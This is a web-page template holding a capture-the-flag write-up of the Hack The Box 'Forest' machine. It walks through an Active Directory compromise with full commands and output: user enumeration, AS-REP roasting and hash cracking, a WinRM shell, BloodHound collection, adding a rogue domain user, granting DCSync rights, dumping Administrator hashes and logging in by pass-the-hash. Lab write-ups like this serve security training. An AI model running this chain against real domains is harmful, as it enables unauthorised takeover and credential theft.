@@ -1,0 +1,300 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Forest</h1>
+    <p class="text">Difficulty : Easy | UserDifficulty : 4.7</p>
+
+    <h2 class="subtitle"></h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT      STATE    SERVICE         VERSION
+53/tcp    open     domain          Simple DNS Plus
+88/tcp    open     kerberos-sec    Microsoft Windows Kerberos (server time: 2025-11-09 03:06:02Z)
+135/tcp   open     msrpc           Microsoft Windows RPC
+139/tcp   open     netbios-ssn     Microsoft Windows netbios-ssn
+389/tcp   open     ldap            Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+398/tcp   filtered kryptolan
+445/tcp   open     microsoft-ds    Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp   open     kpasswd5?
+593/tcp   open     ncacn_http      Microsoft Windows RPC over HTTP 1.0
+636/tcp   open     tcpwrapped
+1485/tcp  filtered lansource
+3268/tcp  open     ldap            Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp  open     tcpwrapped
+5985/tcp  open     http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+8020/tcp  filtered intu-ec-svcdisc
+9389/tcp  open     mc-nmf          .NET Message Framing
+10529/tcp filtered unknown
+21805/tcp filtered unknown
+23480/tcp filtered unknown
+25459/tcp filtered unknown
+26057/tcp filtered unknown
+29262/tcp filtered unknown
+30361/tcp filtered unknown
+31181/tcp filtered unknown
+34522/tcp filtered unknown
+39627/tcp filtered unknown
+40145/tcp filtered unknown
+43270/tcp filtered unknown
+43852/tcp filtered unknown
+47001/tcp open     http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open     msrpc           Microsoft Windows RPC
+49665/tcp open     msrpc           Microsoft Windows RPC
+49666/tcp open     msrpc           Microsoft Windows RPC
+49667/tcp open     msrpc           Microsoft Windows RPC
+49671/tcp open     msrpc           Microsoft Windows RPC
+49680/tcp open     ncacn_http      Microsoft Windows RPC over HTTP 1.0
+49681/tcp open     msrpc           Microsoft Windows RPC
+49685/tcp open     msrpc           Microsoft Windows RPC
+49697/tcp open     msrpc           Microsoft Windows RPC
+52520/tcp filtered unknown
+52953/tcp filtered unknown
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div>
+
+<p class="text">Though there are many open ports, we are only interested into smb and ldap. In this case, deep enumeration is the key to get access to the target machine.</p>
+<div class="code-box"><pre><code>└─$ <u>enum4linux -a $IP</u>
+...
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]</code></pre></div>
+
+<p class="text">Fortunately, enum4linux revealed several user name. At this point, we can test if there are users who doesn't require password and vulnerable to AS-REP roasting.</p>
+<p class="text">Let's copy and paste this output and create username list.</p>
+<div class="code-box"><pre><code>└─$ echo 'user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]' > users</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ <u>grep -oP '(?i)(?&lt;=user:\[)[^:\s\)\\]]+' users > users.txt</u>
+
+└─$ <u>cat users.txt</u>
+Administrator
+Guest
+krbtgt
+DefaultAccount
+$331000-VK4ADACQNUCA
+SM_2c8eef0a09b545acb
+SM_ca8c2ed5bdab4dc9b
+SM_75a538d3025e4db9a
+SM_681f53d4942840e18
+SM_1b41c9286325456bb
+SM_9b69f1b9d2cc45549
+SM_7c96b981967141ebb
+SM_c75ee099d0a64c91b
+SM_1ffab36a2f5f479cb
+HealthMailboxc3d7722
+HealthMailboxfc9daad
+HealthMailboxc0a90c9
+HealthMailbox670628e
+HealthMailbox968e74d
+HealthMailbox6ded678
+HealthMailbox83d6781
+HealthMailboxfd87238
+HealthMailboxb01ac64
+HealthMailbox7108a4e
+HealthMailbox0659cc1
+sebastien
+lucinda
+svc-alfresco
+andy
+mark
+santi</code></pre></div>
+
+
+<h2 class="subtitle">Foothold</h2>
+<p class="text">We could create users list to perform AS-REP roasting test. We can send request to Kerberos authentication and if the user doesn't require password, we can get password hash of the user.</p>
+<div class="code-box"><pre><code>└─$ for name in $(cat users.txt); do impacket-GetNPUsers htb.local/$name -request -no-pass -dc-ip 10.129.95.210 ;done
+...
+[*] Getting TGT for lucinda
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting TGT for svc-alfresco
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:0f787cc7d098a7598398ede65a7b942d$f6c3761ced8bf3b54d396c6f143f04ee8022f8ff46a38a9901b6a4d2ce604b12546f272bce4121e054a19f0dcbeabf986a210333b2eb30828ff4569a27cd25f6d120b42288d84015fe1f05993cfd4cb639831e0c2dd0e1609068e52e999378a0f93e63ed63716d2d4150bfa18a095e0551f193100ce367ea2ea27bc30ad182dafb6940fb8bd3d19eb6f0f4bb5244527322a1ecb648657838f0c4c0bdb6026480071324fa46455ac0eca7e7b5a6c14b2c5812b7fe228fca64685d436f41b457e05ccf4bdc27757afd3a739a4bc88b7ff3821d544ccbecff5abc143d3aefff52c3eb07403856bf
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting TGT for andy
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+...</code></pre></div>
+
+<p class="text">Fortunately there was. We can crack this hash using tools like john or hashcat. Copy and paste hash to your local file and...</p>
+<div class="code-box"><pre><code>└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                         
+...
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:<u>s3rvice</u></code></pre></div>
+
+<p class="text">We got password for svc-alfresco user.</p>
+
+<div class="code-box"><pre><code>└─$ evil-winrm -i 10.129.95.210 -u svc-alfresco -p 's3rvice'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
+htb/svc-alfresco</code></pre></div>
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">Always the key to pwn domain is to know the structure of the target Active directory. For that pursope, bloodhound is always great option.</p>
+<p class="text"><u>※Target machine's OS is relatively old one. Therefore, we cannot use the latest version of SharpHound to generate zip file. You can find legacy version sharphound in <a href="https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.exe">here</a>.</u></p>
+
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> <u>upload ../bloodhound/leg_SharpHound.exe</u>
+                                        
+Info: Uploading /home/kali/tempo/../bloodhound/leg_SharpHound.exe to C:\Users\svc-alfresco\desktop\leg_SharpHound.exe
+                                        
+Data: 1395368 bytes of 1395368 bytes copied
+                                        
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> <u>.\leg_SharpHound.exe -c All</u>
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> <u>download 20251108200857_BloodHound.zip</u>
+                                        
+Info: Downloading C:\Users\svc-alfresco\desktop\20251108200857_BloodHound.zip to 20251108200857_BloodHound.zip
+                                        
+Info: Download successful!</code></pre></div>
+
+<p class="text">Then we can analyze target's objects structure to find the path to the Domain Admins.</p>
+
+<h3>Analysis with BloodHound</h3>
+<div class="img">
+    <img src="{% static 'EthHack/images/forest/1.png' %}" alt="">\
+    <p class="text">First of all, I found the user svc-alfresco is the member of the group <u>Account Operators</u>.</p>
+</div>
+
+<p class="text">According to the Microsoft official documents...</p>
+<p class="text"><strong>The Account Operators group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including accounts for users, Local groups, and Global groups. Group members can sign in locally to domain controllers.</strong></p>
+<p class="text">This means, if there is a group which is highly privileged, we can add arbidtary users to the group and obtain the privileges. </p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/forest/2.png' %}" alt="">
+    <p class="text">Also, searching the pathway to the Domain Admins, I found there is a group <u>EXCHANGE WINDOWS PERMISSION</u> which has WriteDacl privilege to the target machine. We can create user and make it into this higly privileged group, and take full access to the group.</p>
+</div>
+
+<p class="text">Microsoft official documets :</p>
+<p class="text"><strong>If an object has a DACL, the system allows only the access that is explicitly allowed by the access control entries (ACEs) in the DACL.</strong></p>
+
+<p class="text">Let's create user who is member of the group exchange windows permission.</p>
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> net user me test123! /add /domain
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> net group "Exchange Windows Permissions" me /add
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> net localgroup "Remote Management users" me /add
+The command completed successfully.</code></pre></div>
+
+<p class="text">Then, we can add DCsync right to the user me we created. We can do that with PowerView.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> <u>upload ../utils/Windows/PowerView.ps1</u>
+                                        
+Info: Uploading /home/kali/tempo/../utils/Windows/PowerView.ps1 to C:\Users\svc-alfresco\desktop\PowerView.ps1
+                                        
+Data: 1027036 bytes of 1027036 bytes copied
+                                        
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> <u>$pass = convertto-securestring 'test123!' -asplain -force</u>
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> <u>$cred = new-object system.management.automation.pscredential('htb\me', $pass)</u>
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> <u>Import-Module .\PowerView.ps1</u>
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> <u>Add-ObjectACL -PrincipalIdentity me -Credential $cred -Rights DCSync</u></code></pre></div>
+
+
+<p class="text">Since we created user obtains DCSync right, we can get hash for all users.</p>
+<div class="code-box"><pre><code>└─$ impacket-secretsdump -just-dc-user administrator htb/me@10.129.95.210
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:<u>32693b11e6aa90eb43d32c72a07ceea6</u>:::
+[*] Kerberos keys grabbed
+htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
+htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
+htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
+[*] Cleaning up... </code></pre></div>
+
+<p class="text">We can use this hash to login as administrator.</p>
+<div class="code-box"><pre><code>└─$ evil-winrm -i 10.129.95.210 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+htb\administrator</code></pre></div>
+
+
+</body>
+</html>
